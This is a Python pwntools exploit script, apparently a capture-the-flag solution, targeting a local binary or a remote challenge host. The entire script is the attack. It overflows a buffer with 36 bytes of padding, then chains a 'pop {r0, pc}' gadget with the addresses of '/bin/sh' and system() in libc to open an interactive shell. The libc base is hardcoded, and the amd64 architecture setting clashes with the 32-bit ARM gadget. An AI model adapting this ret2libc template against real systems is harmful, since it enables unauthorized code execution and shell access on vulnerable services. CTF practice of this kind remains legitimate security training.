import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=process('./1')
			io=process(['./1'],env={'LD_PRELOAD':'/lib/libc.so.6'})
			elf=ELF('./1')
			libc=ELF('/lib/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',25946)
			elf=ELF('./1')
			libc=ELF('./libc-2.23.so')

		libc_base  = 0xf67c8000 - 0x13f000
		pad = 36
		'''
		0x0010dc84 : pop {r0, pc}
		'''
		prp = libc_base + 0x0010dc84
		binshaddr = libc_base + libc.search('/bin/sh').next()
		sysaddr  = libc_base + libc.symbols['system']
		io.recv()

		pay = 'a'*pad  + p32(prp)  + p32(binshaddr) + p32(sysaddr)
		io.send(pay)
		

		
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue